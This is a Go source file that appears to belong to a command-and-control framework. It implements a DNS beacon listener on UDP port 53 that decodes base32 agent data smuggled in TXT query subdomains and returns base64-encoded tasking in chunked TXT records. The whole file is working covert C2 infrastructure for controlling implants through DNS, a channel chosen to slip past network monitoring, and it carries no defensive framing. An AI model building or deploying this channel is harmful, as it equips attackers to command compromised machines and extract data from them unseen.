package server

import (
	"encoding/base32"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log/slog"
	"net"
	"strings"
	"sync"

	"github.com/miekg/dns"
)

// DNSBeaconListener runs a DNS C2 server on UDP :53.
// It handles TXT-type DNS queries for agent beaconing and A-type queries for stub resolution.
type DNSBeaconListener struct {
	sync.Mutex
	Domain  string // e.g. "c2.example.com"
	ID      uint   // listener DB ID
	server  *dns.Server
	handler func(string, []byte) []byte // fn(agentID, requestJSON) → responseJSON
	AgentIP string
	running bool
}

// NewDNSBeaconListener creates a DNS C2 listener
func NewDNSBeaconListener(domain string, agentIP string, listenerID uint) *DNSBeaconListener {
	return &DNSBeaconListener{
		Domain:  domain,
		ID:      listenerID,
		AgentIP: agentIP,
	}
}

// SetHandler sets the beacon processing callback
func (dl *DNSBeaconListener) SetHandler(fn func(string, []byte) []byte) {
	dl.handler = fn
}

// Start binds UDP :53 and serves DNS
func (dl *DNSBeaconListener) Start() error {
	dl.Lock()
	defer dl.Unlock()
	if dl.running {
		return nil
	}

	mux := dns.NewServeMux()
	mux.HandleFunc(".", dl.handleQuery)

	dl.server = &dns.Server{
		Addr:    ":53",
		Net:     "udp",
		Handler: mux,
	}

	dl.running = true
	slog.Info("DNS C2 listener starting", "domain", dl.Domain, "addr", ":53")
	go func() {
		if err := dl.server.ListenAndServe(); err != nil {
			slog.Error("DNS C2 listener failed", "error", err)
			dl.Lock()
			dl.running = false
			dl.Unlock()
		}
	}()
	return nil
}

// Stop shuts down the DNS listener
func (dl *DNSBeaconListener) Stop() error {
	dl.Lock()
	defer dl.Unlock()
	if !dl.running || dl.server == nil {
		return nil
	}
	dl.running = false
	return dl.server.Shutdown()
}

// IsRunning returns whether the listener is active
func (dl *DNSBeaconListener) IsRunning() bool {
	dl.Lock()
	defer dl.Unlock()
	return dl.running
}

// ── DNS Query Handler ──────────────────────────────────────────────────────────

func (dl *DNSBeaconListener) handleQuery(w dns.ResponseWriter, r *dns.Msg) {
	if len(r.Question) == 0 {
		return
	}

	q := r.Question[0]
	qname := strings.TrimSuffix(q.Name, ".")

	if !strings.HasSuffix(strings.ToLower(qname), strings.ToLower(dl.Domain)) {
		m := new(dns.Msg)
		m.SetReply(r)
		m.SetRcode(r, dns.RcodeRefused)
		w.WriteMsg(m)
		return
	}

	switch q.Qtype {
	case dns.TypeA:
		dl.handleAType(w, r)
	case dns.TypeTXT:
		dl.handleTXTType(w, r)
	default:
		m := new(dns.Msg)
		m.SetReply(r)
		w.WriteMsg(m)
	}
}

func (dl *DNSBeaconListener) handleAType(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	ip := net.ParseIP(dl.AgentIP)
	if ip == nil {
		ip = net.ParseIP("127.0.0.1")
	}
	if ipv4 := ip.To4(); ipv4 != nil {
		rr, _ := dns.NewRR(fmt.Sprintf("%s A %s", r.Question[0].Name, ipv4.String()))
		m.Answer = append(m.Answer, rr)
	}
	w.WriteMsg(m)
}

// handleTXTType processes beacon TXT queries.
// Query format: <hex-uuid>[.<base32data>].dns.<domain>
//
//	<hex-uuid>:  32 hex chars (UUID without dashes)
//	<base32data>: optional base32-encoded JSON beacon request (no padding)
//	.dns.:       fixed tag separating agent data from the domain
//	<domain>:    the configured DNS domain
//
// Response TXT: base64-encoded beaconResponse JSON (split into 255-char chunks)
func (dl *DNSBeaconListener) handleTXTType(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)

	qname := strings.TrimSuffix(r.Question[0].Name, ".")

	// Strip the domain suffix to get the agent prefix
	prefix := strings.ToLower(qname)
	domainLower := strings.ToLower(dl.Domain)
	idx := strings.LastIndex(prefix, ".dns."+domainLower)
	if idx < 0 {
		addTXTRecord(m, r.Question[0].Name, "")
		w.WriteMsg(m)
		return
	}

	// Get everything before ".dns."
	agentPart := prefix[:idx]
	if agentPart == "" {
		addTXTRecord(m, r.Question[0].Name, "")
		w.WriteMsg(m)
		return
	}

	labels := strings.Split(agentPart, ".")
	agentID := labels[0]
	if len(agentID) > 64 {
		agentID = agentID[:64]
	}

	// If there are additional labels after the UUID, they contain base32-encoded data
	var requestData []byte
	if len(labels) > 1 {
		dataLabels := labels[1:]
		combined := ""
		for _, l := range dataLabels {
			combined += l
		}
		requestData, _ = decodeBase32NoPad(combined)
	}

	dl.processBeacon(agentID, requestData, m, r)
	w.WriteMsg(m)
}

func (dl *DNSBeaconListener) processBeacon(agentID string, requestData []byte, m *dns.Msg, r *dns.Msg) {
	if dl.handler == nil {
		addTXTRecord(m, r.Question[0].Name, "")
		return
	}

	// If the query carried embedded JSON data, use it; otherwise build a minimal request
	var reqJSON []byte
	if len(requestData) > 0 {
		reqJSON = requestData
	} else {
		reqMap := map[string]string{"uuid": agentID}
		reqJSON, _ = json.Marshal(reqMap)
	}

	respJSON := dl.handler(agentID, reqJSON)
	encoded := base64.StdEncoding.EncodeToString(respJSON)
	addTXTRecord(m, r.Question[0].Name, encoded)
}

func addTXTRecord(m *dns.Msg, name string, value string) {
	if value == "" {
		value = " "
	}
	for i := 0; i < len(value); i += 255 {
		end := i + 255
		if end > len(value) {
			end = len(value)
		}
		chunk := value[i:end]
		rr, _ := dns.NewRR(fmt.Sprintf("%s TXT \"%s\"", name, chunk))
		m.Answer = append(m.Answer, rr)
	}
}

// decodeBase32NoPad decodes base32 without padding characters
func decodeBase32NoPad(s string) ([]byte, error) {
	s = strings.ToUpper(s)
	pad := 8 - (len(s) % 8)
	if pad < 8 {
		s += strings.Repeat("=", pad)
	}
	return base32.StdEncoding.DecodeString(s)
}


